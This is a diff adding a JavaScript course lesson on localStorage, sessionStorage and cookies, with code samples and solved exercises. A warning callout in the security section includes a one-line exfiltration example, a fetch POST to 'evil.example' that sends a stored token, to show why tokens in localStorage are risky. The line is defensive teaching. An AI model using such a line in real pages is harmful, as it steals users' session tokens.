@@ -1,0 +1,413 @@
+---
+title: Browser Storage
+summary: "Save data in the browser with localStorage, sessionStorage and cookies, and know which one to use and what never to put in them."
+order: 4
+takeaways:
+  - localStorage keeps strings for one origin until you clear them, sessionStorage does the same for a single tab, and both are synchronous and limited to roughly 5 MB.
+  - Web Storage only stores strings, so objects need JSON.stringify on the way in and JSON.parse on the way out, with a try/catch around the parse.
+  - Cookies are small, are sent to the server on every matching request, and are the right tool when the server needs to read the value.
+  - Any script on your page can read localStorage and non-HttpOnly cookies, so an XSS bug exposes everything stored there.
+  - Never keep long-lived secrets such as session tokens or passwords in localStorage; use an HttpOnly, Secure, SameSite cookie set by the server instead.
+  - Storage can be full, blocked or disabled, so wrap reads and writes in try/catch and make the page work without it.
+videos:
+  - title: "cookies vs localStorage vs sessionStorage - Beau teaches JavaScript"
+    channel: "freeCodeCamp.org"
+    duration: "9:04"
+    url: https://www.youtube.com/watch?v=AwicscsvGLg
+  - title: "JavaScript Cookies vs Local Storage vs Session Storage"
+    channel: "Web Dev Simplified"
+    duration: "14:27"
+    url: https://www.youtube.com/watch?v=GihQAC1I39Q
+docs:
+  - title: "MDN: Web Storage API"
+    url: https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API
+  - title: "MDN: Window.localStorage"
+    url: https://developer.mozilla.org/en-US/docs/Web/API/Window/localStorage
+  - title: "MDN: Using HTTP cookies"
+    url: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+---
+
+Everything you have built so far forgets itself when the page reloads. Variables live in memory, and memory is wiped on every refresh. Real apps need to remember things: the theme you picked, the half-written form, the items in a cart, whether you are logged in. The browser gives you a few places to keep that data, and choosing the wrong one is a classic source of bugs and security holes.
+
+This lesson matters for three reasons. Interviewers love the "localStorage vs sessionStorage vs cookies" question. Later in this course your progress, quiz scores and the Todo app all use `localStorage`. And the authentication lessons depend on understanding why a token in `localStorage` is risky.
+
+## Why the browser needs storage
+
+When a page loads, JavaScript starts with a blank slate. There are three broad ways to carry data across a reload:
+
+- **On the server**, in a database. Durable and shared across devices, but it needs a network request and usually a login.
+- **In the URL**, as a query string. Shareable and bookmarkable, but visible and limited in size.
+- **In the browser**, using the storage APIs in this lesson. Fast and private to one browser, but not shared across devices and never fully trustworthy.
+
+All browser storage is scoped to an **origin**: the combination of scheme, host and port. Data saved by `https://example.com` is invisible to `https://other.com`, and even to `http://example.com` or `https://example.com:8080`.
+
+## localStorage: the basics
+
+`localStorage` is a simple key-value store that survives page reloads, tab closes and browser restarts. You can try every example in the DevTools console of any page.
+
+```js
+localStorage.setItem("theme", "dark");        // write
+localStorage.getItem("theme");                // "dark"
+localStorage.getItem("missing");              // null (not undefined!)
+localStorage.removeItem("theme");             // delete one key
+localStorage.clear();                         // delete everything for this origin
+
+localStorage.setItem("a", "1");
+localStorage.setItem("b", "2");
+console.log(localStorage.length);             // 2
+console.log(localStorage.key(0));             // "a" (order is not guaranteed)
+```
+
+Things to know:
+
+- **Keys and values are always strings.** Anything else is converted with `String()`.
+- A missing key returns `null`, not `undefined`.
+- It is **synchronous**: reading or writing blocks the main thread, so keep values small.
+- The limit is roughly **5 MB per origin** (it varies by browser). Going over throws an error.
+- You can also use property syntax (`localStorage.theme = "dark"`), but `getItem` and `setItem` are safer because a key like `length` or `key` would collide with built-in members.
+
+### The "everything is a string" trap
+
+```js
+localStorage.setItem("count", 5);
+const count = localStorage.getItem("count");
+console.log(count, typeof count);   // "5" "string"
+console.log(count + 1);             // "51"  (string concatenation, not 6)
+console.log(Number(count) + 1);     // 6
+
+localStorage.setItem("user", { name: "Ada" });
+console.log(localStorage.getItem("user"));   // "[object Object]" (data lost!)
+```
+
+The second example is the most common beginner bug: passing an object stores the useless text `[object Object]`.
+
+## Storing objects and arrays with JSON
+
+Convert to a string with `JSON.stringify` when saving and back with `JSON.parse` when loading:
+
+```js
+const todos = [
+  { id: 1, text: "Learn storage", done: false },
+  { id: 2, text: "Build a project", done: false },
+];
+
+localStorage.setItem("todos", JSON.stringify(todos));
+
+const saved = JSON.parse(localStorage.getItem("todos"));
+console.log(saved[0].text);   // "Learn storage"
+```
+
+### Reading safely
+
+`JSON.parse` throws on invalid input, and `getItem` returns `null` when the key does not exist. Users can also open DevTools and edit values by hand, so never trust what comes back. Wrap reading in a small helper:
+
+```js
+function loadJson(key, fallback) {
+  try {
+    const raw = localStorage.getItem(key);
+    return raw === null ? fallback : JSON.parse(raw);
+  } catch {
+    return fallback;   // corrupt JSON, or storage is blocked
+  }
+}
+
+function saveJson(key, value) {
+  try {
+    localStorage.setItem(key, JSON.stringify(value));
+    return true;
+  } catch {
+    return false;      // quota exceeded, private mode, or storage disabled
+  }
+}
+
+const todos = loadJson("todos", []);
+```
+
+Some values do not survive JSON. `Date` becomes a string, `undefined` and functions are dropped, `Map` and `Set` become `{}`. Convert them yourself (for example, store `date.toISOString()` and rebuild with `new Date(text)`).
+
+### Versioned keys
+
+Your data shape will change over time. If a user has old data saved and you ship new code that expects a different shape, the app can break for exactly those users. A simple defence is to put a version in the key: `fs-learn-progress-v1`. When the shape changes, switch to `v2`, and the old data is simply ignored (or migrated). This course's own progress and quiz scores use that pattern.
+
+<Callout type="warning" title="Storage can fail">
+`setItem` throws when storage is full, and in some private-browsing modes or when the user blocks site data it is unavailable altogether. Always wrap storage calls in `try/catch`, and make sure the page still works when nothing can be saved.
+</Callout>
+
+## sessionStorage
+
+`sessionStorage` has the same API as `localStorage` but a shorter life: the data lasts only as long as the **tab** that created it.
+
+```js
+sessionStorage.setItem("wizardStep", "2");
+sessionStorage.getItem("wizardStep");   // "2"
+```
+
+- Reloading the page keeps the data. Closing the tab clears it.
+- Two tabs of the same site have **separate** `sessionStorage`, even on the same origin.
+- It is useful for temporary state that should not leak between tabs: a multi-step form draft, a "dismissed this banner for now" flag, or a scroll position.
+
+| | `localStorage` | `sessionStorage` |
+| --- | --- | --- |
+| Lifetime | Until cleared | Until the tab closes |
+| Shared between tabs | Yes (same origin) | No |
+| Survives reload | Yes | Yes |
+| Typical use | Preferences, saved drafts, progress | Per-tab temporary state |
+
+## Reacting to changes in other tabs
+
+When one tab changes `localStorage`, other tabs of the same origin receive a `storage` event. It does **not** fire in the tab that made the change.
+
+```js
+window.addEventListener("storage", (event) => {
+  if (event.key === "theme") {
+    console.log(`theme changed from ${event.oldValue} to ${event.newValue}`);
+    applyTheme(event.newValue);
+  }
+});
+```
+
+This is how you keep a theme or a logged-in state in sync across tabs, and it is exactly what the progress store in this site does to update every open tab.
+
+## Cookies
+
+Cookies are the oldest browser storage and the only one the **server** can read automatically. The browser attaches matching cookies to every request to that site, which is why they power logins and sessions.
+
+A server sets a cookie with a response header:
+
+```http
+Set-Cookie: sessionId=abc123; Max-Age=3600; Path=/; Secure; HttpOnly; SameSite=Lax
+```
+
+JavaScript can also read and write cookies through `document.cookie`, which is an awkward string API:
+
+```js
+document.cookie = "language=en; Max-Age=31536000; Path=/; SameSite=Lax";
+console.log(document.cookie);   // "language=en; theme=dark" (all readable cookies in one string)
+
+// Delete a cookie by expiring it
+document.cookie = "language=; Max-Age=0; Path=/";
+
+function getCookie(name) {
+  return document.cookie
+    .split("; ")
+    .find((row) => row.startsWith(`${name}=`))
+    ?.split("=")[1];
+}
+```
+
+The important attributes:
+
+| Attribute | What it does |
+| --- | --- |
+| `Max-Age` / `Expires` | How long the cookie lives. Without either it is a **session cookie** and is deleted when the browser closes. |
+| `Path` | Which URL paths the cookie is sent to. Use `/` for the whole site. |
+| `Domain` | Which hosts receive it. Omit it to limit the cookie to the exact host. |
+| `Secure` | Only send it over HTTPS. |
+| `HttpOnly` | **Hide it from JavaScript.** The browser still sends it, but `document.cookie` cannot read it. |
+| `SameSite` | Controls whether it is sent on cross-site requests (`Strict`, `Lax`, `None`). It is your main defence against CSRF. |
+
+Cookies are small (about 4 KB each) and add weight to every request, so do not use them as general storage. Use them when the **server needs the value**, and keep the contents small, such as a session ID.
+
+## Choosing the right place
+
+| Need | Use |
+| --- | --- |
+| Server must read it on each request (login session) | Cookie, set by the server with `HttpOnly; Secure; SameSite` |
+| UI preference (theme, language, collapsed sidebar) | `localStorage` |
+| Draft that should vanish when the tab closes | `sessionStorage` |
+| Progress, saved lists, recent searches (small) | `localStorage` |
+| Large or structured data (thousands of records, files, offline apps) | IndexedDB |
+| Cached network responses for offline use | Cache API with a service worker |
+| Data other devices or people must see | A server and a database |
+
+IndexedDB is a much larger asynchronous database built into browsers. Libraries such as `idb` or Dexie wrap it, so you rarely use it directly.
+
+## Security: what never to store
+
+Any JavaScript running on your page can read `localStorage`, `sessionStorage` and every cookie that is not `HttpOnly`. That includes your own code, third-party scripts, browser extensions and, worst of all, an attacker's script injected through a cross-site scripting (XSS) bug like the one in the DOM lesson.
+
+So the rule is:
+
+- **Fine to store:** theme, language, UI state, non-sensitive drafts, public IDs, recent searches.
+- **Never store:** passwords, payment details, personal data you would not want leaked, and **long-lived authentication tokens**.
+
+<Callout type="warning" title="Tokens in localStorage">
+A JWT or session token in `localStorage` is stolen by a single XSS bug: `fetch("https://evil.example", { method: "POST", body: localStorage.getItem("token") })`. A session cookie marked `HttpOnly` cannot be read by script at all, which is why the authentication lessons use cookies for sessions. Combine it with `Secure` and `SameSite` and sanitise anything you render.
+</Callout>
+
+Also remember that the user controls their browser. They can read, edit and delete anything in storage, so **never trust stored values for security decisions** (for example, a `isAdmin: true` flag in `localStorage` grants nothing; the server must check permissions itself).
+
+## A reusable persisted value
+
+Putting the pieces together, here is a small helper that keeps a value in memory, saves it on every change, and tells you when another tab changes it:
+
+```js
+function createPersisted(key, initial, version = 1) {
+  const storageKey = `${key}-v${version}`;
+  let value = loadJson(storageKey, initial);
+  const listeners = new Set();
+  const notify = () => listeners.forEach((fn) => fn(value));
+
+  window.addEventListener("storage", (e) => {
+    if (e.key !== storageKey) return;
+    value = loadJson(storageKey, initial);
+    notify();
+  });
+
+  return {
+    get: () => value,
+    set(next) {
+      value = typeof next === "function" ? next(value) : next;
+      saveJson(storageKey, value);
+      notify();
+    },
+    subscribe: (fn) => (listeners.add(fn), () => listeners.delete(fn)),
+  };
+}
+
+const todos = createPersisted("todos", []);
+todos.subscribe((list) => console.log("todos now:", list.length));
+todos.set((list) => [...list, { id: 1, text: "Persist me", done: false }]);
+```
+
+React state libraries do the same job for you. You will see it again with Zustand's `persist` middleware in Phase 2.
+
+<Exercise title="Persistent counter">
+Create a button and a number on the page. Each click increments the number. Reload the page and the number should still be there. Add a "Reset" button that removes the saved value.
+
+<Solution>
+```js
+const KEY = "clicks-v1";
+const output = document.querySelector("#count");
+
+let count = Number(localStorage.getItem(KEY)) || 0;   // null becomes 0, and so does NaN
+output.textContent = count;
+
+document.querySelector("#inc").addEventListener("click", () => {
+  count += 1;
+  output.textContent = count;
+  localStorage.setItem(KEY, count);                    // numbers are converted to strings
+});
+
+document.querySelector("#reset").addEventListener("click", () => {
+  localStorage.removeItem(KEY);
+  count = 0;
+  output.textContent = count;
+});
+```
+Remember that `getItem` returns a string, so convert with `Number` before doing math.
+</Solution>
+</Exercise>
+
+<Exercise title="Predict the output">
+What does each line log?
+
+```js
+localStorage.clear();
+localStorage.setItem("n", 10);
+localStorage.setItem("flag", false);
+localStorage.setItem("user", { name: "Ada" });
+
+console.log(localStorage.getItem("n") + 1);
+console.log(localStorage.getItem("flag") ? "truthy" : "falsy");
+console.log(localStorage.getItem("user"));
+console.log(localStorage.getItem("nope"));
+```
+
+<Solution>
+```text
+101                // "10" + 1 is string concatenation
+truthy             // the string "false" is truthy; compare with === "false" instead
+[object Object]    // objects must go through JSON.stringify
+null               // missing keys return null, not undefined
+```
+All values are strings, which is why storing booleans needs `JSON.stringify(false)` and `JSON.parse` on the way back.
+</Solution>
+</Exercise>
+
+<Exercise title="Theme toggle that respects the system">
+Build a theme toggle button. On load, use the saved theme if there is one, otherwise follow `window.matchMedia("(prefers-color-scheme: dark)")`. Toggling saves the choice and sets `document.documentElement.dataset.theme`. If the user changes the theme in another tab, this tab should update too.
+
+<Solution>
+```js
+const KEY = "theme-v1";
+
+function systemTheme() {
+  return window.matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light";
+}
+
+function readTheme() {
+  try {
+    const saved = localStorage.getItem(KEY);
+    return saved === "dark" || saved === "light" ? saved : systemTheme();   // validate stored data
+  } catch {
+    return systemTheme();
+  }
+}
+
+function applyTheme(theme) {
+  document.documentElement.dataset.theme = theme;
+}
+
+applyTheme(readTheme());
+
+document.querySelector("#toggle").addEventListener("click", () => {
+  const next = document.documentElement.dataset.theme === "dark" ? "light" : "dark";
+  applyTheme(next);
+  try {
+    localStorage.setItem(KEY, next);
+  } catch {
+    // Storage blocked: the theme still changes for this visit.
+  }
+});
+
+window.addEventListener("storage", (e) => {
+  if (e.key === KEY) applyTheme(readTheme());   // other tab changed it
+});
+```
+Note how the saved value is validated before use, because it could have been edited or corrupted.
+</Solution>
+</Exercise>
+
+<Exercise title="Recent searches list">
+Write `addRecentSearch(term)` that stores the 5 most recent search terms in `localStorage`. The newest comes first, duplicates (ignoring case) move to the front instead of repeating, blank terms are ignored, and a corrupt saved value does not crash the function. Add `getRecentSearches()` and `clearRecentSearches()`.
+
+<Solution>
+```js
+const KEY = "recent-searches-v1";
+const MAX = 5;
+
+function getRecentSearches() {
+  try {
+    const parsed = JSON.parse(localStorage.getItem(KEY) ?? "[]");
+    return Array.isArray(parsed) ? parsed.filter((t) => typeof t === "string") : [];
+  } catch {
+    return [];
+  }
+}
+
+function addRecentSearch(term) {
+  const clean = term.trim();
+  if (!clean) return getRecentSearches();
+
+  const rest = getRecentSearches().filter((t) => t.toLowerCase() !== clean.toLowerCase());
+  const next = [clean, ...rest].slice(0, MAX);
+  try {
+    localStorage.setItem(KEY, JSON.stringify(next));
+  } catch {
+    // Ignore storage errors; the list just won't persist.
+  }
+  return next;
+}
+
+function clearRecentSearches() {
+  try {
+    localStorage.removeItem(KEY);
+  } catch {
+    // Nothing to clean up if storage is unavailable.
+  }
+}
+```
+You will reuse this exact helper in the GitHub search project.
+</Solution>
+</Exercise>
